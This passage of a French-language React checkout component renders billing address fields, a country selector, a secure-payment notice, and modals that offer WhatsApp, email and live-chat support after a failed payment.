                  placeholder={selectedCountry ? `Ex: ${selectedCountry.phone} XX XX XX XX` : "Numéro de téléphone"}
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Adresse complète
                </label>
                {selectedCountry && (
                  <div className="text-xs text-gray-500 mb-2">
                    Format attendu: {getAddressTemplate(selectedCountry.code).format}
                  </div>
                )}
                <textarea
                  required
                  rows={3}
                  value={billingInfo.address}
                  onChange={(e) => setBillingInfo({...billingInfo, address: e.target.value})}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 resize-none"
                  placeholder={selectedCountry ? getAddressTemplate(selectedCountry.code).example : "Adresse complète de facturation"}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    <span className="text-red-500">*</span> Code postal
                  </label>
                  <input
                    type="text"
                    required
                    value={billingInfo.postalCode}
                    onChange={(e) => setBillingInfo({...billingInfo, postalCode: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                    placeholder={selectedCountry?.code === 'FR' ? "75001" : selectedCountry?.code === 'US' ? "10001" : "Code postal"}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    <span className="text-red-500">*</span> Ville
                  </label>
                  <input
                    type="text"
                    required
                    value={billingInfo.city}
                    onChange={(e) => setBillingInfo({...billingInfo, city: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                    placeholder={selectedCountry?.code === 'FR' ? "Paris" : selectedCountry?.code === 'US' ? "New York" : selectedCountry?.code === 'DE' ? "Berlin" : "Ville"}
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Pays de facturation
                </label>
                <select
                  value={billingInfo.country}
                  onChange={(e) => handleCountryChange(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  required
                >
                  <option value="">Sélectionnez votre pays...</option>
                  
                  {/* Europe */}
                  <optgroup label="🇪🇺 Europe">
                    {COUNTRIES_BY_CONTINENT.Europe.map(country => (
                      <option key={country.code} value={country.code}>
                        {country.name} ({country.phone})
                      </option>
                    ))}
                  </optgroup>
                  
                  {/* Amériques */}
                  <optgroup label="🌎 Amériques">
                    {COUNTRIES_BY_CONTINENT.Americas.map(country => (
                      <option key={country.code} value={country.code}>
                        {country.name} ({country.phone})
                      </option>
                    ))}
                  </optgroup>
                  
                  {/* Afrique */}
                  <optgroup label="🌍 Afrique">
                    {COUNTRIES_BY_CONTINENT.Africa.map(country => (
                      <option key={country.code} value={country.code}>
                        {country.name} ({country.phone})
                      </option>
                    ))}
                  </optgroup>
                </select>
                {selectedCountry && (
                  <div className="text-xs text-blue-600 mt-1">
                    Format téléphone: {getAddressTemplate(selectedCountry.code).phoneFormat}
                  </div>
                )}
              </div>
            </div>

            {/* Sécurité */}
            <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-200">
              <div className="flex items-center">
                <svg className="w-5 h-5 text-green-600 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
                <span className="text-sm text-green-800 font-medium">Paiement 100% sécurisé</span>
              </div>
              <p className="text-xs text-green-700 mt-1">
                Vos données sont cryptées et sécurisées selon les standards PCI DSS
              </p>
            </div>
          </div>
        </div>

        {/* Modal de contact agent */}
        {showContactModal && contactOptions && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-xl shadow-2xl max-w-md w-full p-6">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
                  </svg>
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Problème de paiement</h3>
                <p className="text-gray-600 mb-4">{errorMessage}</p>
                <p className="text-sm text-gray-500 mb-4">
                  Référence: <span className="font-mono text-xs">{paymentAttemptId}</span>
                </p>
              </div>

              <div className="space-y-3 mb-6">
                <p className="text-sm font-medium text-gray-900 text-center">Contactez un agent pour vous aider :</p>
                
                <button
                  onClick={() => handleContactAgent('phone')}
                  className="w-full flex items-center justify-center px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                >
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                  </svg>
                  Appeler {contactOptions.phone}
                </button>

                <button
                  onClick={() => handleContactAgent('whatsapp')}
                  className="w-full flex items-center justify-center px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
                >
                  <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.890-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.787"/>
                  </svg>
                  WhatsApp {contactOptions.whatsapp}
                </button>

                <button
                  onClick={() => handleContactAgent('email')}
                  className="w-full flex items-center justify-center px-4 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
                >
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                  Email {contactOptions.email}
                </button>

                {contactOptions.livechat && (
                  <button
                    onClick={() => handleContactAgent('livechat')}
                    className="w-full flex items-center justify-center px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors"
                  >
                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                    Chat en direct
                  </button>
                )}
              </div>

              <div className="border-t pt-4">
                <button
                  onClick={() => setShowContactModal(false)}
                  className="w-full px-4 py-2 text-gray-600 hover:text-gray-800 transition-colors"
                >
                  Fermer
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Modal d'échec de paiement */}
        {showPaymentError && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-2xl max-w-md w-full max-h-[90vh] overflow-y-auto">
              <div className="p-6">
                {/* Header */}
                <div className="text-center mb-6">
                  <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z" />
                    </svg>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900 mb-2">
                    Paiement échoué
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Nous n'avons pas pu traiter votre paiement. Plusieurs options s'offrent à vous pour résoudre ce problème.
                  </p>
                </div>

                {/* Raisons possibles */}
                <div className="bg-gray-50 rounded-lg p-4 mb-6">
                  <h4 className="font-semibold text-gray-900 mb-2">Raisons possibles :</h4>
                  <ul className="text-sm text-gray-600 space-y-1">
                    <li>• Solde insuffisant</li>
                    <li>• Carte expirée ou bloquée</li>
                    <li>• Limite de carte atteinte</li>
                    <li>• Problème technique temporaire</li>
                  </ul>
                </div>

                {/* Options de contact */}
                <div className="space-y-3 mb-6">
                  <h4 className="font-semibold text-gray-900">Besoin d'aide ? Contactez-nous :</h4>
                  
                  {/* WhatsApp */}
                  <button
                    onClick={() => {
                      window.open(`https://wa.me/${SUPPORT_CONFIG.whatsapp.replace(/[^\d]/g, '')}?text=Bonjour, j'ai un problème avec mon paiement pour ${selectedProduct?.name || 'ma commande'}. Pouvez-vous m'aider ?`, '_blank');
                    }}
                    className="w-full flex items-center justify-center space-x-3 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 transition-colors"
                  >
                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.890-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.515"/>
                    </svg>
                    <span>Assistance WhatsApp</span>
                    <div className="text-xs bg-green-500 px-2 py-1 rounded-full">Réponse rapide</div>
                  </button>

                  {/* Chat en direct */}
                  <button
                    onClick={() => {
                      setShowPaymentError(false);
                      // setShowSupport(true); // Temporairement désactivé
                    }}
                    className="w-full flex items-center justify-center space-x-3 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-colors"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                    <span>Chat en direct</span>
                    <div className="text-xs bg-blue-500 px-2 py-1 rounded-full">{SUPPORT_CONFIG.responseTime}</div>
                  </button>

                  {/* Email */}
                  <button
                    onClick={() => {
                      window.open(`mailto:${SUPPORT_CONFIG.supportEmail}?subject=Problème de paiement&body=Bonjour,%0D%0A%0D%0AJe rencontre un problème avec mon paiement pour ${selectedProduct?.name || 'ma commande'}.%0D%0A%0D%0AMerci de me recontacter.`, '_blank');
                    }}
                    className="w-full flex items-center justify-center space-x-3 bg-gray-600 text-white py-3 rounded-lg hover:bg-gray-700 transition-colors"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                    <span>Support par email</span>
                  </button>
                </div>

                {/* Actions */}
                <div className="flex space-x-3">
                  <button
                    onClick={() => setShowPaymentError(false)}
                    className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors"
                  >
                    Réessayer plus tard
                  </button>
                  <button
                    onClick={() => {
                      setShowPaymentError(false);
                      // Réinitialiser le formulaire pour un nouvel essai
                    }}
                    className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                  >
                    Nouvelle tentative
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Support Chat Widget */}
        {/* Temporairement désactivé - Support Chat Widget
        <SupportChat
          isOpen={showSupport}
          onClose={() => setShowSupport(false)}
          initialMessage={selectedProduct ? `Problème de paiement pour ${selectedProduct.name}` : 'Problème de paiement'}
        />
        */}

        {/* Floating Support Button */}
        {!showSupport && !showPaymentError && (
          <button
            // onClick={() => setShowSupport(true)} // Temporairement désactivé
            className="fixed bottom-6 right-6 w-14 h-14 bg-gray-900 text-white rounded-full shadow-lg hover:shadow-xl transition-all duration-200 z-40 flex items-center justify-center group hover:bg-gray-800"
          >
            <svg className="w-6 h-6 transition-transform group-hover:scale-110" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
            </svg>
            <div className="absolute -top-2 -right-2 w-4 h-4 bg-gray-600 rounded-full animate-pulse"></div>
          </button>
        )}
      </div>
    </div>
  );
}